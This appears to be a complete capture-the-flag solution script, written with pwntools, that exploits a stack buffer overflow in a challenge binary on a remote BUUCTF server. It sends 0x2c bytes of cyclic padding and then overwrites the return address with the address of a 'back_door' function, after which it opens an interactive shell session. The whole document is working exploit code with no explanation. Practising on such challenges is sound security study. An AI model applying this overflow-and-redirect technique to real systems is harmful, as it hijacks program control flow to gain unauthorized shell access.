from pwn import *


p = remote("node4.buuoj.cn", 25395)

back_door = 0x080485CB

pad = cyclic(0x28+0x4)+p32(back_door)
p.sendline(pad)

p.interactive()

